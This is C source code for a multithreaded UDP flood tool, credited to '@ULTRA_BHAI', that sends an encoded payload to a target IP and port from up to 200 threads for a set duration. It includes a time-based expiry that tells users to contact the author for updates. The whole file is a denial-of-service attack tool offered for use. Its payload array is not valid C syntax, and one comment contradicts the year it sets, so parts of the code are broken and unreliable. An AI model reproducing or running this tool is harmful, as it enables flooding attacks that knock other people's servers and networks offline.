#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>

#define MAX_THREADS 200  // Define the maximum allowed threads

void usage() {
    printf("Usage: ./ultra ip port duration threads\n");
    exit(1);
}

// Function to decode the hidden payload (e.g., encoded in hex)
void decode_payload(char *output) {
    unsigned char hidden_payload[] = {\x10\xb5\xb8\xad\xc4\x89\x21\x25\x1e\xda\xd3\x2e\xb3\xf6\xd0\x0c\x39\x0f\xe1\x4e\xf2\x32\xd6\x4d\xa8\x54\xc4\x8f\x8c\x2b\x90\x72\x5a\x97\xc0\x06\xb5\x95\xb9\x01\x6b\x5d\xa2\xf6\x95\xe7\xd5\x7f\x79\xe3\x74\x30\x95\x85\x40\xe5\xeb\x7f\x93\x7e\x57\xf5\x40\x16\x39\x48\x53\xcd\x63\xa5\xf8\x15\x26\xde\xfd\xa1\xf9\x8e\x15\xc0\x05\xb8\x7b\x21\x15\xc5\x6f\xeb\x38\x5e\x55\x9a\xe6\x87\x04\x5f\x5c\x50\x2c\x44\x6f\x97\xa3\xb3\xc1\xac\x27\xaf\xed\x2d\xea\xde\xe7\xe3\x64\x21\xb1\x50\xfa\x5e\x6d\x00\x0d\x29\x9c\x93\x56\x57};  // "YHA PR PAYLOADS DALNA H"
    memcpy(output, hidden_payload, sizeof(hidden_payload));
    output[sizeof(hidden_payload)] = '\0';  // Null-terminate the string
}

// Struct to pass parameters to threads
typedef struct {
    char ip[16];
    int port;
    int duration;
} AttackParams;

void *attack(void *arg) {
    AttackParams *params = (AttackParams *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    char payload[256]; // Buffer to hold the decoded payload
    decode_payload(payload);  // Decode and store the payload

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->port);
    server_addr.sin_addr.s_addr = inet_addr(params->ip);

    endtime = time(NULL) + params->duration;

    // Loop infinitely, sending the payload to the target
    while (time(NULL) <= endtime) {
        if (sendto(sock, payload, strlen(payload), 0,
                   (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            close(sock);
            pthread_exit(NULL);
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    // Check if threads exceed the maximum allowed limit
    if (threads > MAX_THREADS) {
        fprintf(stderr, "Error: Number of threads exceeds the maximum limit (%d).\n", MAX_THREADS);
        exit(1);
    }

    struct tm expiration_tm = {0};
    expiration_tm.tm_year = 2026 - 1900;  // Set year to 2025
    expiration_tm.tm_mon = 11;            // Set month to December
    expiration_tm.tm_mday = 31;           // Set day to 31
    expiration_tm.tm_hour = 23;           // Set hour to 23
    expiration_tm.tm_min = 59;            // Set minute to 59
    expiration_tm.tm_sec = 59;            // Set second to 59

    time_t expiration_time = mktime(&expiration_tm);

    if (expiration_time == -1) {
        perror("Error setting expiration time");
        exit(1);
    }

    printf("Flood started on %s:%d for %d seconds with %d threads\n", ip, port, duration, threads);

    if (time(NULL) >= expiration_time) {
        printf("@ULTRA_BHAI contact for new updates\n");
        exit(1);
    }

    pthread_t thread_ids[threads];
    AttackParams params;
    strncpy(params.ip, ip, sizeof(params.ip) - 1);
    params.ip[sizeof(params.ip) - 1] = '\0';
    params.port = port;
    params.duration = duration;

    // Create threads
    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, &params) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
    }

    // Wait for threads to finish
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    printf("Attack finished. Made by @ULTRA_BHAI\n");
    return 0;
}
